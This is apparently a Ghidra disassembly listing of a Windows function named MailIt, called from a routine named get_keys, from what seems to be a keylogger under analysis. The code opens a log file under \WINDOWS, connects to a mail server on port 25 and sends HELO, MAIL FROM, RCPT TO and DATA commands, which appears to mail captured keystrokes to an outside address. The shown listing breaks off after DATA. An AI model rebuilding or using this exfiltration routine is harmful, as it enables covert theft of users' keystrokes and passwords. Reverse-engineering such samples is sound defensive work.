```
                             **************************************************************
                             * MailIt(char*, char*, char*, char*, char*)                  *
                             **************************************************************
                             undefined4 __cdecl MailIt(char * param_1, char * param_2
             undefined4        EAX:4          <RETURN>
             char *            Stack[0x4]:4   param_1                                 XREF[1]:     004019eb(R)  
             char *            Stack[0x8]:4   param_2                                 XREF[3]:     00401d58(R), 
                                                                                                   00401d67(R), 
                                                                                                   00401f3d(R)  
             char *            Stack[0xc]:4   param_3                                 XREF[3]:     00401c4c(R), 
                                                                                                   00401c5b(R), 
                                                                                                   00401f7e(R)  
             char *            Stack[0x10]:4  param_4                                 XREF[1]:     00401fbf(R)  
             char *            Stack[0x14]:4  param_5                                 XREF[1]:     00401fea(R)  
             undefined4        Stack[-0x10]:4 local_10                                XREF[16]:    00401ab2(W), 
                                                                                                   00401add(R), 
                                                                                                   00401b31(R), 
                                                                                                   00401bbe(R), 
                                                                                                   00401bfb(R), 
                                                                                                   00401cca(R), 
                                                                                                   00401d07(R), 
                                                                                                   00401dd6(R), 
                                                                                                   00401e13(R), 
                                                                                                   00401ea0(R), 
                                                                                                   00401edd(R), 
                                                                                                   00402051(R), 
                                                                                                   0040208e(R), 
                                                                                                   0040211b(R), 
                                                                                                   00402158(R), 
                                                                                                   004021a1(R)  
             undefined1        Stack[-0x1ac   local_1ac                               XREF[1]:     004019a3(*)  
             undefined4        Stack[-0x1b0   local_1b0                               XREF[17]:    0040199d(W), 
                                                                                                   004019c1(R), 
                                                                                                   00401ab5(R), 
                                                                                                   00401b54(R), 
                                                                                                   00401b82(R), 
                                                                                                   00401c1e(R), 
                                                                                                   00401c8e(R), 
                                                                                                   00401d2a(R), 
                                                                                                   00401d9a(R), 
                                                                                                   00401e36(R), 
                                                                                                   00401e64(R), 
                                                                                                   00401f00(R), 
                                                                                                   00402015(R), 
                                                                                                   004020b1(R), 
                                                                                                   004020df(R), 
                                                                                                   0040217b(R), 
                                                                                                   00402193(R)  
             undefined4        Stack[-0x1b4   local_1b4                               XREF[6]:     00401bcc(W), 
                                                                                                   00401cd8(W), 
                                                                                                   00401de4(W), 
                                                                                                   00401eae(W), 
                                                                                                   0040205f(W), 
                                                                                                   00402129(W)  
             undefined4        Stack[-0x1b8   local_1b8                               XREF[14]:    00401b3f(W), 
                                                                                                   00401b4b(R), 
                                                                                                   00401c09(W), 
                                                                                                   00401c15(R), 
                                                                                                   00401d15(W), 
                                                                                                   00401d21(R), 
                                                                                                   00401e21(W), 
                                                                                                   00401e2d(R), 
                                                                                                   00401eeb(W), 
                                                                                                   00401ef7(R), 
                                                                                                   0040209c(W), 
                                                                                                   004020a8(R), 
                                                                                                   00402166(W), 
                                                                                                   00402172(R)  
             undefined4        Stack[-0x1bc   local_1bc                               XREF[5]:     004019f9(W), 
                                                                                                   004019ff(R), 
                                                                                                   00401a3e(R), 
                                                                                                   00401a4c(R), 
                                                                                                   00401a6c(R)  
             undefined2        Stack[-0x1ca   local_1ca                               XREF[1]:     00401a8c(W)  
             undefined2        Stack[-0x1cc   local_1cc                               XREF[4]:     00401a30(*), 
                                                                                                   00401a5b(*), 
                                                                                                   00401a76(W), 
                                                                                                   00401ad3(*)  
             undefined1        Stack[-0x5bc   local_5bc                               XREF[38]:    00401b74(*), 
                                                                                                   00401b8c(*), 
                                                                                                   00401b9a(*), 
                                                                                                   00401bb4(*), 
                                                                                                   00401c3e(*), 
                                                                                                   00401c62(*), 
                                                                                                   00401c80(*), 
                                                                                                   00401c98(*), 
                                                                                                   00401ca6(*), 
                                                                                                   00401cc0(*), 
                                                                                                   00401d4a(*), 
                                                                                                   00401d6e(*), 
                                                                                                   00401d8c(*), 
                                                                                                   00401da4(*), 
                                                                                                   00401db2(*), 
                                                                                                   00401dcc(*), 
                                                                                                   00401e56(*), 
                                                                                                   00401e6e(*), 
                                                                                                   00401e7c(*), 
                                                                                                   00401e96(*)  
             undefined4        Stack[-0x5c0   local_5c0                               XREF[22]:    00401983(W), 
                                                                                                   00401b27(R), 
                                                                                                   00401b45(R), 
                                                                                                   00401b5e(R), 
                                                                                                   00401bf1(R), 
                                                                                                   00401c0f(R), 
                                                                                                   00401c28(R), 
                                                                                                   00401cfd(R), 
                                                                                                   00401d1b(R), 
                                                                                                   00401d34(R), 
                                                                                                   00401e09(R), 
                                                                                                   00401e27(R), 
                                                                                                   00401e40(R), 
                                                                                                   00401ed3(R), 
                                                                                                   00401ef1(R), 
                                                                                                   00401f0a(R), 
                                                                                                   00402084(R), 
                                                                                                   004020a2(R), 
                                                                                                   004020bb(R), 
                                                                                                   0040214e(R)  
             undefined4        Stack[-0x5c4   local_5c4                               XREF[2]:     004019dc(W), 
                                                                                                   004021b4(R)  
             undefined4        Stack[-0x5d8   local_5d8                               XREF[3]:     00401989(W), 
                                                                                                   004019a9(W), 
                                                                                                   004019c7(W)  
             undefined4        Stack[-0x5dc   local_5dc                               XREF[5]:     00401977(*), 
                                                                                                   00401991(*), 
                                                                                                   004019ad(*), 
                                                                                                   004019cb(*), 
                                                                                                   004019ee(*)  
                             __Z6MailItPcS_S_S_S_                            XREF[1]:     get_keys:00401931(c)  
                             MailIt
        0040196e 55              PUSH       EBP
        0040196f 89 e5           MOV        EBP,ESP
        00401971 81 ec d8        SUB        ESP,0x5d8
                 05 00 00
        00401977 c7 04 24        MOV        dword ptr [ESP]=>local_5dc,0x12d
                 2d 01 00 00
        0040197e e8 8d 0e        CALL       malloc                                           undefined malloc(size_t param_1)
                 00 00
        00401983 89 85 44        MOV        dword ptr [EBP + local_5c0],EAX
                 fa ff ff
        00401989 c7 44 24        MOV        dword ptr [ESP + local_5d8],DAT_00404013         = 61h    a
                 04 13 40 
                 40 00
        00401991 c7 04 24        MOV        dword ptr [ESP]=>local_5dc,s_\WINDOWS\lzwz.av_   = "\\WINDOWS\\lzwz.av"
                 7c 44 40 00
        00401998 e8 f3 0e        CALL       fopen                                            undefined fopen(char * param_1, 
                 00 00
        0040199d 89 85 54        MOV        dword ptr [EBP + local_1b0],EAX
                 fe ff ff
        004019a3 8d 85 58        LEA        EAX=>local_1ac,[EBP + 0xfffffe58]
                 fe ff ff
        004019a9 89 44 24 04     MOV        dword ptr [ESP + local_5d8],EAX
        004019ad c7 04 24        MOV        dword ptr [ESP]=>local_5dc,0x202
                 02 02 00 00
        004019b4 e8 07 08        CALL       _WSAStartup@8                                    int _WSAStartup@8(WORD wVersionR
                 00 00
        004019b9 83 ec 08        SUB        ESP,0x8
        004019bc 83 f8 ff        CMP        EAX,-0x1
        004019bf 75 2a           JNZ        LAB_004019eb
        004019c1 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        004019c7 89 44 24 04     MOV        dword ptr [ESP + local_5d8],EAX
        004019cb c7 04 24        MOV        dword ptr [ESP]=>local_5dc,s_WSAStartup_failed   = "WSAStartup failed"
                 8d 44 40 00
        004019d2 e8 99 0e        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        004019d7 e8 f4 07        CALL       _WSACleanup@0                                    int _WSACleanup@0(void)
                 00 00
        004019dc c7 85 40        MOV        dword ptr [EBP + local_5c4],0xffffffff
                 fa ff ff 
                 ff ff ff ff
        004019e6 e9 c9 07        JMP        LAB_004021b4
                 00 00
                             LAB_004019eb                                    XREF[1]:     004019bf(j)  
        004019eb 8b 45 08        MOV        EAX,dword ptr [EBP + param_1]
        004019ee 89 04 24        MOV        dword ptr [ESP]=>local_5dc,EAX
        004019f1 e8 ea 07        CALL       gethostbyname                                    undefined gethostbyname(char * p
                 00 00
        004019f6 83 ec 04        SUB        ESP,0x4
        004019f9 89 85 48        MOV        dword ptr [EBP + local_1bc],EAX
                 fe ff ff
        004019ff 83 bd 48        CMP        dword ptr [EBP + local_1bc],0x0
                 fe ff ff 00
        00401a06 75 18           JNZ        LAB_00401a20
        00401a08 c7 04 24        MOV        dword ptr [ESP],s_gethostbyname_0040449f         = "gethostbyname"
                 9f 44 40 00
        00401a0f e8 dc 0d        CALL       perror                                           undefined perror(char * param_1)
                 00 00
        00401a14 c7 04 24        MOV        dword ptr [ESP],0x1
                 01 00 00 00
        00401a1b e8 c0 0d        CALL       exit                                             undefined exit(int param_1)
                 00 00
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
                             LAB_00401a20                                    XREF[1]:     00401a06(j)  
        00401a20 c7 44 24        MOV        dword ptr [ESP + 0x8],0x10
                 08 10 00 
                 00 00
        00401a28 c7 44 24        MOV        dword ptr [ESP + 0x4],0x0
                 04 00 00 
                 00 00
        00401a30 8d 85 38        LEA        EAX=>local_1cc,[EBP + 0xfffffe38]
                 fe ff ff
        00401a36 89 04 24        MOV        dword ptr [ESP],EAX
        00401a39 e8 92 0d        CALL       memset                                           undefined memset(void * param_1,
                 00 00
        00401a3e 8b 85 48        MOV        EAX,dword ptr [EBP + local_1bc]
                 fe ff ff
        00401a44 0f bf 40 0a     MOVSX      EAX,word ptr [EAX + 0xa]
        00401a48 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401a4c 8b 85 48        MOV        EAX,dword ptr [EBP + local_1bc]
                 fe ff ff
        00401a52 8b 40 0c        MOV        EAX,dword ptr [EAX + 0xc]
        00401a55 8b 00           MOV        EAX,dword ptr [EAX]
        00401a57 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401a5b 8d 85 38        LEA        EAX=>local_1cc,[EBP + 0xfffffe38]
                 fe ff ff
        00401a61 83 c0 04        ADD        EAX,0x4
        00401a64 89 04 24        MOV        dword ptr [ESP],EAX
        00401a67 e8 54 0d        CALL       memcpy                                           undefined memcpy(void * param_1,
                 00 00
        00401a6c 8b 85 48        MOV        EAX,dword ptr [EBP + local_1bc]
                 fe ff ff
        00401a72 0f b7 40 08     MOVZX      EAX,word ptr [EAX + 0x8]
        00401a76 66 89 85        MOV        word ptr [EBP + local_1cc],AX
                 38 fe ff ff
        00401a7d c7 04 24        MOV        dword ptr [ESP],0x19
                 19 00 00 00
        00401a84 e8 67 07        CALL       htons                                            undefined htons(u_short param_1)
                 00 00
        00401a89 83 ec 04        SUB        ESP,0x4
        00401a8c 66 89 85        MOV        word ptr [EBP + local_1ca],AX
                 3a fe ff ff
        00401a93 c7 44 24        MOV        dword ptr [ESP + 0x8],0x0
                 08 00 00 
                 00 00
        00401a9b c7 44 24        MOV        dword ptr [ESP + 0x4],0x1
                 04 01 00 
                 00 00
        00401aa3 c7 04 24        MOV        dword ptr [ESP],0x2
                 02 00 00 00
        00401aaa e8 51 07        CALL       socket                                           undefined socket(int param_1, in
                 00 00
        00401aaf 83 ec 0c        SUB        ESP,0xc
        00401ab2 89 45 f4        MOV        dword ptr [EBP + local_10],EAX
        00401ab5 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401abb 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401abf c7 04 24        MOV        dword ptr [ESP],s_Connecting...._004044ad        = "Connecting....\n"
                 ad 44 40 00
        00401ac6 e8 a5 0d        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401acb c7 44 24        MOV        dword ptr [ESP + 0x8],0x10
                 08 10 00 
                 00 00
        00401ad3 8d 85 38        LEA        EAX=>local_1cc,[EBP + 0xfffffe38]
                 fe ff ff
        00401ad9 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401add 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401ae0 89 04 24        MOV        dword ptr [ESP],EAX
        00401ae3 e8 28 07        CALL       connect                                          undefined connect(SOCKET param_1
                 00 00
        00401ae8 83 ec 0c        SUB        ESP,0xc
        00401aeb 83 f8 ff        CMP        EAX,-0x1
        00401aee 75 18           JNZ        LAB_00401b08
        00401af0 c7 04 24        MOV        dword ptr [ESP],s_connect_004044bd               = "connect"
                 bd 44 40 00
        00401af7 e8 f4 0c        CALL       perror                                           undefined perror(char * param_1)
                 00 00
        00401afc c7 04 24        MOV        dword ptr [ESP],0x1
                 01 00 00 00
        00401b03 e8 d8 0c        CALL       exit                                             undefined exit(int param_1)
                 00 00
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
                             LAB_00401b08                                    XREF[1]:     00401aee(j)  
        00401b08 c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00401b0f e8 2c 0e        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00401b14 83 ec 04        SUB        ESP,0x4
        00401b17 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401b1f c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        00401b27 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401b2d 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401b31 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401b34 89 04 24        MOV        dword ptr [ESP],EAX
        00401b37 e8 e4 06        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00401b3c 83 ec 10        SUB        ESP,0x10
        00401b3f 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        00401b45 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401b4b 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        00401b51 c6 00 00        MOV        byte ptr [EAX],0x0
        00401b54 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401b5a 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401b5e 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401b64 89 04 24        MOV        dword ptr [ESP],EAX
        00401b67 e8 04 0d        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401b6c c7 44 24        MOV        dword ptr [ESP + 0x4],s_helo_typical-jam2.0cat   = "helo typical-jam2.0catch.com\n"
                 04 c5 44 
                 40 00
        00401b74 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401b7a 89 04 24        MOV        dword ptr [ESP],EAX
        00401b7d e8 2e 0c        CALL       strcpy                                           undefined strcpy(char * param_1,
                 00 00
        00401b82 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401b88 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401b8c 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401b92 89 04 24        MOV        dword ptr [ESP],EAX
        00401b95 e8 d6 0c        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401b9a 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401ba0 89 04 24        MOV        dword ptr [ESP],EAX
        00401ba3 e8 f8 0b        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00401ba8 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401bb0 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401bb4 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401bba 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401bbe 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401bc1 89 04 24        MOV        dword ptr [ESP],EAX
        00401bc4 e8 67 06        CALL       send                                             undefined send(SOCKET param_1, c
                 00 00
        00401bc9 83 ec 10        SUB        ESP,0x10
        00401bcc 89 85 50        MOV        dword ptr [EBP + local_1b4],EAX
                 fe ff ff
        00401bd2 c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00401bd9 e8 62 0d        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00401bde 83 ec 04        SUB        ESP,0x4
        00401be1 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401be9 c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        00401bf1 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401bf7 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401bfb 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401bfe 89 04 24        MOV        dword ptr [ESP],EAX
        00401c01 e8 1a 06        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00401c06 83 ec 10        SUB        ESP,0x10
        00401c09 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        00401c0f 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401c15 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        00401c1b c6 00 00        MOV        byte ptr [EAX],0x0
        00401c1e 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401c24 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401c28 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401c2e 89 04 24        MOV        dword ptr [ESP],EAX
        00401c31 e8 3a 0c        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401c36 c7 44 24        MOV        dword ptr [ESP + 0x4],s_MAIL_FROM:<_004044e3     = "MAIL FROM:<"
                 04 e3 44 
                 40 00
        00401c3e 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401c44 89 04 24        MOV        dword ptr [ESP],EAX
        00401c47 e8 64 0b        CALL       strcpy                                           undefined strcpy(char * param_1,
                 00 00
        00401c4c 8b 45 10        MOV        EAX,dword ptr [EBP + param_3]
        00401c4f 89 04 24        MOV        dword ptr [ESP],EAX
        00401c52 e8 49 0b        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00401c57 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401c5b 8b 45 10        MOV        EAX,dword ptr [EBP + param_3]
        00401c5e 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401c62 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401c68 89 04 24        MOV        dword ptr [ESP],EAX
        00401c6b e8 20 0b        CALL       strncat                                          undefined strncat(char * param_1
                 00 00
        00401c70 c7 44 24        MOV        dword ptr [ESP + 0x8],0x3
                 08 03 00 
                 00 00
        00401c78 c7 44 24        MOV        dword ptr [ESP + 0x4],DAT_004044ef               = 3Eh    >
                 04 ef 44 
                 40 00
        00401c80 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401c86 89 04 24        MOV        dword ptr [ESP],EAX
        00401c89 e8 02 0b        CALL       strncat                                          undefined strncat(char * param_1
                 00 00
        00401c8e 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401c94 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401c98 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401c9e 89 04 24        MOV        dword ptr [ESP],EAX
        00401ca1 e8 ca 0b        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401ca6 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401cac 89 04 24        MOV        dword ptr [ESP],EAX
        00401caf e8 ec 0a        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00401cb4 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401cbc 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401cc0 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401cc6 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401cca 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401ccd 89 04 24        MOV        dword ptr [ESP],EAX
        00401cd0 e8 5b 05        CALL       send                                             undefined send(SOCKET param_1, c
                 00 00
        00401cd5 83 ec 10        SUB        ESP,0x10
        00401cd8 89 85 50        MOV        dword ptr [EBP + local_1b4],EAX
                 fe ff ff
        00401cde c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00401ce5 e8 56 0c        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00401cea 83 ec 04        SUB        ESP,0x4
        00401ced c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401cf5 c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        00401cfd 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401d03 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401d07 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401d0a 89 04 24        MOV        dword ptr [ESP],EAX
        00401d0d e8 0e 05        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00401d12 83 ec 10        SUB        ESP,0x10
        00401d15 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        00401d1b 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401d21 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        00401d27 c6 00 00        MOV        byte ptr [EAX],0x0
        00401d2a 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401d30 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401d34 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401d3a 89 04 24        MOV        dword ptr [ESP],EAX
        00401d3d e8 2e 0b        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401d42 c7 44 24        MOV        dword ptr [ESP + 0x4],s_RCPT_TO:<_004044f2       = "RCPT TO:<"
                 04 f2 44 
                 40 00
        00401d4a 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401d50 89 04 24        MOV        dword ptr [ESP],EAX
        00401d53 e8 58 0a        CALL       strcpy                                           undefined strcpy(char * param_1,
                 00 00
        00401d58 8b 45 0c        MOV        EAX,dword ptr [EBP + param_2]
        00401d5b 89 04 24        MOV        dword ptr [ESP],EAX
        00401d5e e8 3d 0a        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00401d63 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401d67 8b 45 0c        MOV        EAX,dword ptr [EBP + param_2]
        00401d6a 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401d6e 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401d74 89 04 24        MOV        dword ptr [ESP],EAX
        00401d77 e8 14 0a        CALL       strncat                                          undefined strncat(char * param_1
                 00 00
        00401d7c c7 44 24        MOV        dword ptr [ESP + 0x8],0x3
                 08 03 00 
                 00 00
        00401d84 c7 44 24        MOV        dword ptr [ESP + 0x4],DAT_004044ef               = 3Eh    >
                 04 ef 44 
                 40 00
        00401d8c 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401d92 89 04 24        MOV        dword ptr [ESP],EAX
        00401d95 e8 f6 09        CALL       strncat                                          undefined strncat(char * param_1
                 00 00
        00401d9a 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401da0 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401da4 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401daa 89 04 24        MOV        dword ptr [ESP],EAX
        00401dad e8 be 0a        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401db2 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401db8 89 04 24        MOV        dword ptr [ESP],EAX
        00401dbb e8 e0 09        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00401dc0 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401dc8 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401dcc 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401dd2 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401dd6 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401dd9 89 04 24        MOV        dword ptr [ESP],EAX
        00401ddc e8 4f 04        CALL       send                                             undefined send(SOCKET param_1, c
                 00 00
        00401de1 83 ec 10        SUB        ESP,0x10
        00401de4 89 85 50        MOV        dword ptr [EBP + local_1b4],EAX
                 fe ff ff
        00401dea c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00401df1 e8 4a 0b        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00401df6 83 ec 04        SUB        ESP,0x4
        00401df9 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401e01 c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        00401e09 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401e0f 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401e13 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401e16 89 04 24        MOV        dword ptr [ESP],EAX
        00401e19 e8 02 04        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00401e1e 83 ec 10        SUB        ESP,0x10
        00401e21 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        00401e27 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401e2d 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        00401e33 c6 00 00        MOV        byte ptr [EAX],0x0
        00401e36 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401e3c 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401e40 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401e46 89 04 24        MOV        dword ptr [ESP],EAX
        00401e49 e8 22 0a        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401e4e c7 44 24        MOV        dword ptr [ESP + 0x4],s_DATA_004044fc            = "DATA\n"
                 04 fc 44 
                 40 00
        00401e56 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401e5c 89 04 24        MOV        dword ptr [ESP],EAX
        00401e5f e8 4c 09        CALL       strcpy                                           undefined strcpy(char * param_1,
                 00 00
        00401e64 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
        00401e6a 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401e6e 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401e74 89 04 24        MOV        dword ptr [ESP],EAX
        00401e77 e8 f4 09        CALL       fputs                                            undefined fputs(char * param_1, 
                 00 00
        00401e7c 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401e82 89 04 24        MOV        dword ptr [ESP],EAX
        00401e85 e8 16 09        CALL       strlen                                           undefined strlen(char * param_1)
                 00 00
        00401e8a c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401e92 89 44 24 08     MOV        dword ptr [ESP + 0x8],EAX
        00401e96 8d 85 48        LEA        EAX=>local_5bc,[EBP + 0xfffffa48]
                 fa ff ff
        00401e9c 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401ea0 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401ea3 89 04 24        MOV        dword ptr [ESP],EAX
        00401ea6 e8 85 03        CALL       send                                             undefined send(SOCKET param_1, c
                 00 00
        00401eab 83 ec 10        SUB        ESP,0x10
        00401eae 89 85 50        MOV        dword ptr [EBP + local_1b4],EAX
                 fe ff ff
        00401eb4 c7 04 24        MOV        dword ptr [ESP],0x1f4
                 f4 01 00 00
        00401ebb e8 80 0a        CALL       _Sleep@4                                         void _Sleep@4(DWORD dwMillisecon
                 00 00
        00401ec0 83 ec 04        SUB        ESP,0x4
        00401ec3 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00 
                 00 00
        00401ecb c7 44 24        MOV        dword ptr [ESP + 0x8],0x12c
                 08 2c 01 
                 00 00
        00401ed3 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401ed9 89 44 24 04     MOV        dword ptr [ESP + 0x4],EAX
        00401edd 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]
        00401ee0 89 04 24        MOV        dword ptr [ESP],EAX
        00401ee3 e8 38 03        CALL       recv                                             undefined recv(SOCKET param_1, c
                 00 00
        00401ee8 83 ec 10        SUB        ESP,0x10
        00401eeb 89 85 4c        MOV        dword ptr [EBP + local_1b8],EAX
                 fe ff ff
        00401ef1 8b 85 44        MOV        EAX,dword ptr [EBP + local_5c0]
                 fa ff ff
        00401ef7 03 85 4c        ADD        EAX,dword ptr [EBP + local_1b8]
                 fe ff ff
        00401efd c6 00 00        MOV        byte ptr [EAX],0x0
        00401f00 8b 85 54        MOV        EAX,dword ptr [EBP + local_1b0]
                 fe ff ff
